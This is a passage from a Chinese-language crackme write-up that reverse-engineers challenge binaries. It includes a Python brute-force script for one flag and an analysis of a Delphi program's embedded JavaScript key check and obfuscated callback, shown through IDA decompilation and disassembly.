class="number">0x6E</span>,<span class="number">0x3F</span>,<span class="number">0x40</span>,<span class="number">0x23</span>,<span class="number">0x66</span>,</span><br><span class="line"><span class="number">0x6A</span>,<span class="number">0x27</span>,<span class="number">0x6A</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0x67</span>,<span class="number">0x3B</span>,<span class="number">0x3B</span>]</span><br><span class="line"><span class="comment">#0x20 0x7B 0x39 0x2A 0x38 0x67 0x61 0x2A</span></span><br><span class="line"><span class="comment">#0x6C 0x21 0x54 0x6E 0x3F 0x40 0x23 0x66  </span></span><br><span class="line"><span class="comment">#0x6A 0x27 0x6A 0x24 0x5C 0x67 0x3B 0x3B</span></span><br><span class="line"></span><br><span class="line">array =[<span class="number">0x21</span>,<span class="number">0x3A</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x2B</span>,<span class="number">0x2D</span>,<span class="number">0x2A</span>,<span class="number">0x2F</span>,<span class="number">0x60</span>,<span class="number">0x7E</span>,<span class="number">0x5F</span>,<span class="number">0x5B</span>,</span><br><span class="line"><span class="number">0x5D</span>,<span class="number">0x7B</span>,<span class="number">0x7D</span>,<span class="number">0x3F</span>,<span class="number">0x3C</span>,<span class="number">0x3E</span>,<span class="number">0x2C</span>,<span class="number">0x2E</span>,<span class="number">0x40</span>,<span class="number">0x5E</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,</span><br><span class="line"><span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x6A</span>,<span class="number">0x6B</span>,<span class="number">0x6C</span>,<span class="number">0x6D</span>,<span class="number">0x6E</span>,<span class="number">0x6F</span>,<span class="number">0x70</span>,<span class="number">0x71</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x76</span>,</span><br><span class="line"><span class="number">0x77</span>,<span class="number">0x78</span>,<span class="number">0x79</span>,<span class="number">0x7A</span>,<span class="number">0x30</span>,<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x39</span>,<span class="number">0x5C</span>,<span class="number">0x27</span>,</span><br><span class="line"><span class="number">0x3B</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">mm = [<span class="number">0x9b</span>,<span class="number">0x6b</span>,<span class="number">0xba</span>,<span class="number">0x25</span>,<span class="number">0x73</span>,<span class="number">0x82</span>,<span class="number">0xe0</span>,<span class="number">0x31</span>,<span class="number">0x86</span>,<span class="number">0x80</span>,<span class="number">0xf1</span>,<span class="number">0xc5</span>,<span class="number">0xda</span>,<span class="number">0x82</span>,<span class="number">0xda</span>,<span class="number">0x08</span>,<span class="number">0x38</span>,<span class="number">0x90</span>]</span><br><span class="line"><span class="comment">#mm = [0x25,0x73,0x82]</span></span><br><span class="line">mm2 = []</span><br><span class="line">result  = []</span><br><span class="line"></span><br><span class="line">x1 = <span class="number">0</span></span><br><span class="line">x2 = <span class="number">0</span></span><br><span class="line">x3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> x1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">                mv = mm[<span class="number">0</span>+<span class="number">3</span>*i] ^ x1</span><br><span class="line">                <span class="keyword">if</span> (array[mv&gt;&gt;<span class="number">2</span>] ^ <span class="number">7</span>) == array1[<span class="number">0</span>+<span class="number">4</span>*i]:</span><br><span class="line">                        x11 = <span class="number">16</span> * mv &amp; <span class="number">0x30</span></span><br><span class="line">                        <span class="keyword">for</span> x2 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">                                mv = mm[<span class="number">1</span>+<span class="number">3</span>*i] ^ x2</span><br><span class="line">                                <span class="keyword">if</span>(array[x11 | mv &gt;&gt;<span class="number">4</span>] == array1[<span class="number">1</span>+<span class="number">4</span>*i]):</span><br><span class="line">                                        x22 = <span class="number">4</span> * mv &amp; <span class="number">0x3C</span></span><br><span class="line">                                        <span class="keyword">for</span> x3 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">                                                mv = mm[<span class="number">2</span>+<span class="number">3</span>*i] ^ x3                                       </span><br><span class="line">                                                <span class="keyword">if</span>((array[x22 | (mv &amp; <span class="number">0xc0</span>)&gt;&gt;<span class="number">6</span>]) ^ <span class="number">0xf</span>) == array1[<span class="number">2</span>+<span class="number">4</span>*i]:</span><br><span class="line">                                                        <span class="keyword">if</span> array[mv &amp; <span class="number">0x3F</span>] == array1[<span class="number">3</span>+<span class="number">4</span>*i]:</span><br><span class="line">                                                                <span class="keyword">print</span> chr(x1),chr(x2),chr(x3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">        mv = <span class="number">0x08</span> ^ x1</span><br><span class="line">        <span class="keyword">if</span> (array[mv&gt;&gt;<span class="number">2</span>] ^ <span class="number">7</span>) == <span class="number">0x5c</span>:</span><br><span class="line">                <span class="keyword">print</span> chr(x1)</span><br><span class="line">                x11 = <span class="number">16</span> * mv &amp; <span class="number">0x30</span></span><br><span class="line">                <span class="keyword">if</span> x11 == <span class="number">0x67</span>:</span><br><span class="line">                        <span class="keyword">print</span> chr(x1)</span><br></pre></td></tr></table></figure></p><p>  得出最后的flag为fu0kzHp2aqtZAuY6</p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>第三题是一个dephi编写的程序，主要利用了WebBrowser控件，将密码藏在js代码中。拖入ida，观察到如下函数Tfrmcrackme_FormShow(int a1)：<br>该函数是webbrowser主要内容，通过跟踪和调试，可以比较好的确定webbrowser的代码如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">sptWBCallback</span>(<span class="params">spt_wb_id,spt_wb_name,optionstr</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">url=<span class="string">'#sptWBCallback:id='</span>;</span></span><br><span class="line"><span class="javascript">url=url+spt_wb_id+<span class="string">';eventName='</span>+spt_wb_name;</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span>(optionstr) </span></span><br><span class="line"><span class="javascript">url=url+<span class="string">';params=optionstr'</span>;</span></span><br><span class="line"><span class="undefined">location=url;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">ckpswd</span>(<span class="params"></span>) </span>&#123;    </span></span><br><span class="line"><span class="javascript">key=<span class="string">"simpower91"</span>;    </span></span><br><span class="line"><span class="javascript">a = <span class="built_in">document</span>.all.pswd.value;    </span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (a.indexOf(key) ==<span class="number">0</span>) &#123;        </span></span><br><span class="line"><span class="undefined">l=a.length;        </span></span><br><span class="line"><span class="undefined">i=key.length;        </span></span><br><span class="line"><span class="undefined">sptWBCallback(a.substring(i,l));    </span></span><br><span class="line"><span class="undefined">&#125; </span></span><br><span class="line"><span class="javascript"><span class="keyword">else</span> &#123;        </span></span><br><span class="line"><span class="javascript">alert(<span class="string">"wrong!&lt;"</span> + a + <span class="string">"&gt; is not my GUID ;-)"</span>);        </span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="string">"1234"</span>;    </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">ok</span>(<span class="params"></span>)</span>&#123;  </span></span><br><span class="line"><span class="javascript">alert(<span class="string">"congratulations!"</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">id</span>=<span class="string">"pswd"</span> <span class="attr">size</span>=<span class="string">39</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">value</span>=<span class="string">"checkMyFlag"</span> <span class="attr">onclick</span>=<span class="string">"ckpswd();"</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>得出来key为simpower91，然后会触发sptWBCallback函数，函数会通过location=url复制进行url的变化，在delphi中，该操作是会触发onnavigator2回调函数的，在Tfrmcrackme_FormCreate(int a1)函数中的sub_491DCC函数中，有如下的函数，尝试对sub_492088()下断点，发现可以直接断下，判断该函数为js中location=url的回调函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_491DCC</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  sub_491B78(a1);</span><br><span class="line">  result = *(_DWORD *)(v1 + <span class="number">64</span>);</span><br><span class="line">  *(_DWORD *)(result + <span class="number">676</span>) = v1;</span><br><span class="line">  *(_DWORD *)(result + <span class="number">672</span>) = <span class="number">0x00492088</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟踪该函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __userpurge sptWBCallback@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;eax&gt;, <span class="keyword">int</span> a2@&lt;edx&gt;, <span class="keyword">int</span> a3@&lt;ecx&gt;, <span class="keyword">int</span> a4@&lt;ebx&gt;, <span class="keyword">int</span> a5@&lt;esi&gt;, <span class="keyword">int</span> edi0@&lt;edi&gt;, _WORD *a6, <span class="keyword">int</span> a7, <span class="keyword">int</span> a8, <span class="keyword">int</span> a9, <span class="keyword">int</span> a10, <span class="keyword">int</span> a11)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  System::AnsiString = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)input_url_str = <span class="number">0</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v24 = a4;</span><br><span class="line">  v23 = a5;</span><br><span class="line">  v31 = a3;</span><br><span class="line">  v32 = a2;</span><br><span class="line">  v12 = a1;</span><br><span class="line">  v22 = &amp;savedregs;</span><br><span class="line">  v21 = &amp;loc_4921D1;</span><br><span class="line">  v20 = __readfsdword(<span class="number">0</span>);</span><br><span class="line">  __writefsdword(<span class="number">0</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v20);</span><br><span class="line">  Variants::__<span class="function">linkproc__ <span class="title">VarToLStr</span><span class="params">(&amp;v29, a11)</span></span>;</span><br><span class="line">  v13 = sub_465C88((<span class="keyword">int</span>)&amp;str__sptWBCallback_[<span class="number">1</span>], v29);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v13 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a6 = <span class="number">-1</span>;</span><br><span class="line">    Variants::__<span class="function">linkproc__ <span class="title">VarToLStr</span><span class="params">(&amp;System::AnsiString, a11)</span></span>;</span><br><span class="line">    v14 = LStrLen(System::AnsiString);</span><br><span class="line">    v15 = System::__linkproc__ LStrCopy(System::AnsiString, (<span class="keyword">int</span>)(v13 + <span class="number">15</span>),v14 - (_DWORD)v13 - <span class="number">14</span>,(<span class="keyword">int</span>)&amp;System::AnsiString);</span><br><span class="line">    LOBYTE(v15) = <span class="number">1</span>;</span><br><span class="line">    LStrReplace(System::AnsiString, (<span class="keyword">int</span>)&amp;str___41[<span class="number">1</span>], (<span class="keyword">int</span>)&amp;str____19[<span class="number">1</span>], v12, edi0, (<span class="keyword">int</span>)v13, (<span class="keyword">int</span>)input_url_str, v15);</span><br><span class="line">    System::__linkproc__ LStrLAsg(&amp;System::AnsiString, *(_DWORD *)input_url_str);</span><br><span class="line">    v16 = (Classes::TStrings *)TObject_Create((<span class="keyword">int</span>)cls_Classes_TStringList, <span class="number">1</span>);</span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(Classes::TStrings *, <span class="keyword">int</span>))(*(_DWORD *)v16 + <span class="number">44</span>))(v16, System::AnsiString);<span class="comment">// TStrings.SetTextStr</span></span><br><span class="line">    <span class="keyword">if</span> ( *(_WORD *)(v12 + <span class="number">50</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      Classes::TStrings::GetValue(v16, (<span class="keyword">const</span> <span class="keyword">int</span>)&amp;str_params[<span class="number">1</span>]);</span><br><span class="line">      v17 = v27;</span><br><span class="line">      Classes::TStrings::GetValue(v16, (<span class="keyword">const</span> <span class="keyword">int</span>)&amp;str_eventName[<span class="number">1</span>]);</span><br><span class="line">      v18 = v26;</span><br><span class="line">      Classes::TStrings::GetValue(v16, (<span class="keyword">const</span> <span class="keyword">int</span>)&amp;str_id[<span class="number">1</span>]);</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(_DWORD, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))(v12 + <span class="number">48</span>))(*(_DWORD *)(v12 + <span class="number">52</span>), v25, v18, v17);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(_WORD *)(v12 + <span class="number">58</span>) )</span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(_DWORD, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, _WORD *))(v12 + <span class="number">56</span>))(</span><br><span class="line">      *(_DWORD *)(v12 + <span class="number">60</span>),</span><br><span class="line">      v32,</span><br><span class="line">      v31,</span><br><span class="line">      a11,</span><br><span class="line">      a10,</span><br><span class="line">      a9,</span><br><span class="line">      a8,</span><br><span class="line">      a7,</span><br><span class="line">      a6);</span><br><span class="line">  __writefsdword(<span class="number">0</span>, v20);</span><br><span class="line">  v22 = (<span class="keyword">int</span> *)&amp;loc_4921D8;</span><br><span class="line">  <span class="keyword">return</span> System::__linkproc__ LStrArrayClr(&amp;v25, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续调试，进入到(<em>(void (__fastcall **)(_DWORD, int, int, int))(v12 + 48))(</em>(_DWORD *)(v12 + 52), v25, v18, v17)函数中，继续步进，发现如下函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">CODE:<span class="number">0047394</span>C sub_47394C      proc near               ; CODE XREF: _Tfrmcrackme_Button2Click+A1↓p</span><br><span class="line">CODE:<span class="number">0047394</span>C</span><br><span class="line">CODE:<span class="number">0047394</span>C var_2C          = dword ptr <span class="number">-2</span>Ch</span><br><span class="line">CODE:<span class="number">0047394</span>C var_8           = dword ptr <span class="number">-8</span></span><br><span class="line">CODE:<span class="number">0047394</span>C var_4           = dword ptr <span class="number">-4</span></span><br><span class="line">CODE:<span class="number">0047394</span>C var_s0          = dword ptr  <span class="number">0</span></span><br><span class="line">CODE:<span class="number">0047394</span>C arg_4           = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">CODE:<span class="number">0047394</span>C</span><br><span class="line">CODE:<span class="number">0047394</span>C                 push    ebp</span><br><span class="line">CODE:<span class="number">0047394</span>D                 mov     ebp, esp</span><br><span class="line">CODE:<span class="number">0047394F</span>                 leave</span><br><span class="line">CODE:<span class="number">00473950</span>                 push    dword ptr [esp+<span class="number">0</span>]</span><br><span class="line">CODE:<span class="number">00473953</span>                 push    [esp+var_s0]</span><br><span class="line">CODE:<span class="number">00473956</span>                 push    [esp+<span class="number">4</span>+var_4]</span><br><span class="line">CODE:<span class="number">00473959</span>                 pusha</span><br><span class="line">CODE:<span class="number">0047395</span>A                 pushf</span><br><span class="line">CODE:<span class="number">0047395B</span>                 call    GetA400BaseAddr</span><br><span class="line">CODE:<span class="number">00473960</span>                 mov     ebx, eax</span><br><span class="line">CODE:<span class="number">00473962</span>                 xor     eax, eax</span><br><span class="line">CODE:<span class="number">00473964</span>                 mov     [ebx+<span class="number">1050</span>h], eax</span><br><span class="line">CODE:<span class="number">0047396</span>A                 mov     eax, <span class="number">0F</span>FFFFFFFh</span><br><span class="line">CODE:<span class="number">0047396F</span>                 mov     [ebx+<span class="number">1054</span>h], eax</span><br><span class="line">CODE:<span class="number">00473975</span>                 mov     [esp+<span class="number">2</span>Ch+var_8], ebx</span><br><span class="line">CODE:<span class="number">00473979</span>                 add     [esp+<span class="number">2</span>Ch+var_4], <span class="number">5</span></span><br><span class="line">CODE:<span class="number">0047397</span>E                 mov     eax, [esp+<span class="number">2</span>Ch+arg_4]</span><br><span class="line">CODE:<span class="number">00473982</span>                 mov     [esp+<span class="number">2</span>Ch+var_s0], eax</span><br><span class="line">CODE:<span class="number">00473986</span>                 mov     eax, [ebx+<span class="number">1090</span>h]</span><br><span class="line">CODE:<span class="number">0047398</span>C                 cmp     eax, <span class="number">0</span></span><br><span class="line">CODE:<span class="number">0047398F</span>                 jnz     <span class="keyword">short</span> loc_47399C</span><br><span class="line">CODE:<span class="number">00473991</span>                 mov     eax, offset sub_47378C</span><br><span class="line">CODE:<span class="number">00473996</span>                 mov     [ebx+<span class="number">1090</span>h], eax</span><br><span class="line">CODE:<span class="number">0047399</span>C</span><br><span class="line">CODE:<span class="number">0047399</span>C loc_47399C:                             ; CODE XREF: sub_47394C+<span class="number">43</span>↑j</span><br><span class="line">CODE:<span class="number">0047399</span>C                 popf</span><br><span class="line">CODE:<span class="number">0047399</span>D                 popa</span><br><span class="line">CODE:<span class="number">0047399</span>E                 call    sub_4734B0</span><br><span class="line">CODE:<span class="number">004739</span>A3                 pushf</span><br><span class="line">CODE:<span class="number">004739</span>A4                 pushf</span><br><span class="line">CODE:<span class="number">004739</span>A5                 pushf</span><br><span class="line">CODE:<span class="number">004739</span>A6                 pusha</span><br><span class="line">CODE:<span class="number">004739</span>A7                 pushf</span><br><span class="line">CODE:<span class="number">004739</span>A8                 jmp     <span class="keyword">short</span> loc_4739CE</span><br><span class="line">CODE:<span class="number">004739</span>AA ; ---------------------------------------------------------------------------</span><br><span class="line">CODE:<span class="number">004739</span>AA</span><br><span class="line">CODE:<span class="number">004739</span>AA loc_4739AA:                             ; CODE XREF: sub_47394C+<span class="number">95</span>↓j</span><br><span class="line">CODE:<span class="number">004739</span>AA                 mov     eax, [ebx+<span class="number">1058</span>h]</span><br><span class="line">CODE:<span class="number">004739B</span>0                 mov     [esp+<span class="number">2</span>Ch+var_s0], eax</span><br><span class="line">CODE:<span class="number">004739B</span>4                 mov     eax, [ebx+<span class="number">1050</span>h]</span><br><span class="line">CODE:<span class="number">004739B</span>A                 mov     [esp+<span class="number">2</span>Ch+var_4], eax</span><br><span class="line">CODE:<span class="number">004739B</span>E                 mov     [esp+<span class="number">2</span>Ch+var_8], ebx</span><br><span class="line">CODE:<span class="number">004739</span>C2                 popf</span><br><span class="line">CODE:<span class="number">004739</span>C3                 popa</span><br><span class="line">CODE:<span class="number">004739</span>C4                 call    sub_4734B0</span><br><span class="line">CODE:<span class="number">004739</span>C9                 pushf</span><br><span class="line">CODE:<span class="number">004739</span>CA                 pushf</span><br><span class="line">CODE:<span class="number">004739</span>CB                 pushf</span><br><span class="line">CODE:<span class="number">004739</span>CC                 pusha</span><br><span class="line">CODE:<span class="number">004739</span>CD                 pushf</span><br><span class="line">CODE:<span class="number">004739</span>CE</span><br><span class="line">CODE:<span class="number">004739</span>CE loc_4739CE:                             ; CODE XREF: sub_47394C+<span class="number">5</span>C↑j</span><br><span class="line">CODE:<span class="number">004739</span>CE                 call    GetA400BaseAddr</span><br><span class="line">CODE:<span class="number">004739</span>D3                 mov     ebx, eax</span><br><span class="line">CODE:<span class="number">004739</span>D5                 mov     eax, [ebx+<span class="number">1050</span>h]</span><br><span class="line">CODE:<span class="number">004739</span>DB                 cmp     eax, [ebx+<span class="number">1054</span>h]</span><br><span class="line">CODE:<span class="number">004739E1</span>                 jb      <span class="keyword">short</span> loc_4739AA</span><br><span class="line">CODE:<span class="number">004739E3</span>                 mov     eax, [ebx+<span class="number">1050</span>h]</span><br><span class="line">CODE:<span class="number">004739E9</span>                 mov     [esp+<span class="number">30</span>h], eax</span><br><span class="line">CODE:<span class="number">004739</span>ED                 mov     eax, [esp+<span class="number">2</span>Ch+var_2C]</span><br><span class="line">CODE:<span class="number">004739F</span>0                 mov     [esp+<span class="number">2</span>Ch+var_s0], eax</span><br><span class="line">CODE:<span class="number">004739F</span>4                 popf</span><br><span class="line">CODE:<span class="number">004739F</span>5                 popa</span><br><span class="line">CODE:<span class="number">004739F</span>6                 add     esp, <span class="number">8</span></span><br><span class="line">CODE:<span class="number">004739F</span>9                 popf</span><br><span class="line">CODE:<span class="number">004739F</span>A                 retn    <span class="number">8</span></span><br><span class="line">CODE:<span class="number">004739F</span>A sub_47394C      endp</span><br></pre></td></tr></table></figure></p><p>这个还挺麻烦的，里面有很多的popa,pusha,popf等，所以慢慢跟踪到如下函数.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">CODE:<span class="number">004734B</span>0                 push    ebp</span><br><span class="line">CODE:<span class="number">004734B</span>1                 mov     ebp, esp</span><br><span class="line">CODE:<span class="number">004734B</span>3                 leave</span><br><span class="line">CODE:<span class="number">004734B</span>4                 pusha</span><br><span class="line">CODE:<span class="number">004734B</span>5                 pushf</span><br><span class="line">CODE:<span class="number">004734B</span>6                 push    ebp</span><br><span class="line">CODE:<span class="number">004734B</span>7                 mov     ebp, esp</span><br><span class="line">CODE:<span class="number">004734B</span>9                 sub     esp, <span class="number">10</span>h</span><br><span class="line">CODE:<span class="number">004734B</span>C                 lea     edx, [ebp+var_10]</span><br><span class="line">CODE:<span class="number">004734B</span>F                 push    edx</span><br><span class="line">CODE:<span class="number">004734</span>C0                 lea     edx, [ebp+var_C]</span><br><span class="line">CODE:<span class="number">004734</span>C3                 push    edx</span><br><span class="line">CODE:<span class="number">004734</span>C4                 lea     edx, [ebp+var_8]</span><br><span class="line">CODE:<span class="number">004734</span>C7                 push    edx</span><br><span class="line">CODE:<span class="number">004734</span>C8                 push    [ebp+arg_2C]</span><br><span class="line">CODE:<span class="number">004734</span>CB                 push    [ebp+arg_20]</span><br><span class="line">CODE:<span class="number">004734</span>CE                 push    [ebp+arg_28]</span><br><span class="line">CODE:<span class="number">004734</span>D1                 mov     edx, [ebp+arg_24]</span><br><span 